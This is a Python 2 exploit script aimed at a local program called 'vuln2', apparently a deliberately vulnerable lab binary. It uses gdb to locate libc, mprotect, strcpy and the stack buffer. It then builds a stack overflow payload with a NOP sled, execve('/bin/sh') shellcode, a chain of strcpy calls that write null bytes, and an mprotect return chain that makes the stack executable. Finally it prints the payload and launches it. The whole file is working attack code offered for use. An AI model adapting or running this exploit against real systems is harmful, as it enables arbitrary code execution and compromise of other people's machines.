#!/usr/bin/env python
import struct
import subprocess
import io
import os

with io.FileIO("test.gdb", "w") as file:
	file.write("b main\nrun hello\ninfo proc mappings\n")

with io.FileIO("find_functions.gdb", "w") as file:
	file.write("b main\nrun hello\np mprotect\np __strcpy_sse2\n")

with io.FileIO("find_buf.gdb", "w") as file:
	file.write("b strcpy\nrun hello\nfinish\np/x &buf[0]\n")

proc1 = subprocess.Popen("gdb --batch --command=./test.gdb --args ./vuln2 hello|grep libc|grep so|head -1|awk '{print $1}'", shell=True, stdout=subprocess.PIPE)
proc1.wait()
libc_base_addr = int(proc1.stdout.read(), 16)

proc2 = subprocess.Popen("gdb --batch --command=./find_functions.gdb --args ./vuln2 hello|grep mprotect|head -1|awk '{print $8}'", shell=True, stdout=subprocess.PIPE)
proc2.wait()
mprotect_addr = int(proc2.stdout.read(), 16)

proc3 = subprocess.Popen("gdb --batch --command=./find_functions.gdb --args ./vuln2 hello|grep __strcpy_sse2|head -1|awk '{print $8}'", shell=True, stdout=subprocess.PIPE)
proc3.wait()
strcpy_addr = int(proc3.stdout.read(), 16)

proc4 = subprocess.Popen("gdb --batch --command=./find_buf.gdb --args ./vuln2 hello|tail -1|awk '{print $3}'", shell=True, stdout=subprocess.PIPE)
proc4.wait()

buf_addr = int(proc4.stdout.read(), 16) + 0x10 - 0x180
#0x00 for gdb, 0x30 for r.sh, 0x20 for commandline, 0x10 for this script
os.remove("./test.gdb")
os.remove("./find_functions.gdb")
os.remove("./find_buf.gdb")

proc5 = subprocess.Popen("ldd vuln2|grep libc|awk '{print $3}'", shell=True, stdout=subprocess.PIPE)
proc5.wait()
libc_path = proc5.stdout.read()

strings_command = "strings -t x " + libc_path[:-1] + "|grep /bin/sh|awk '{print $1}'"

proc6 = subprocess.Popen(strings_command, shell=True, stdout=subprocess.PIPE)
proc6.wait()
bin_sh_offset = int(proc6.stdout.read(), 16)

null_byte_location = libc_base_addr + bin_sh_offset + len("/bin/sh")

# JUNK + SYSTEM + EXIT + SYSTEM_ARG
buf = "\x90" * 199
buf += "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
buf += struct.pack("<I",strcpy_addr) * 9

pop_pop_ret_addr = 0x080484ba

constant = 0x17c
buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 4)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 6)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 7)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 9)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 0xa)
buf += struct.pack("<I",null_byte_location)

buf += struct.pack("<I",strcpy_addr)
buf += struct.pack("<I",pop_pop_ret_addr)
buf += struct.pack("<I",buf_addr + constant + 0xb)
buf += struct.pack("<I",null_byte_location)

page_address = ((buf_addr >> 12) << 12) + 0x7f
pop_pop_pop_ret_addr = 0x080484b9
mem_length = 0x7f7f107f
permissions = 0x7f7f7f07
return_address = buf_addr

buf += struct.pack("<I",mprotect_addr)
buf += struct.pack("<I",pop_pop_pop_ret_addr)
buf += struct.pack("<I",page_address)
buf += struct.pack("<I",mem_length)
buf += struct.pack("<I",permissions)
buf += struct.pack("<I",return_address)

rows, columns = os.popen('stty size', 'r').read().split()
print "#"*int(columns)
print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
print "#"*int(columns)
bufstr = buf.encode("hex")
i = 0
exploit_str = ""
while i < len(bufstr) - 1:
	exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
	i += 2
print "`python -c \'print \"" + exploit_str + "\"\'`"
print ""
print "#"*int(columns)

subprocess.call(["./vuln2", buf])
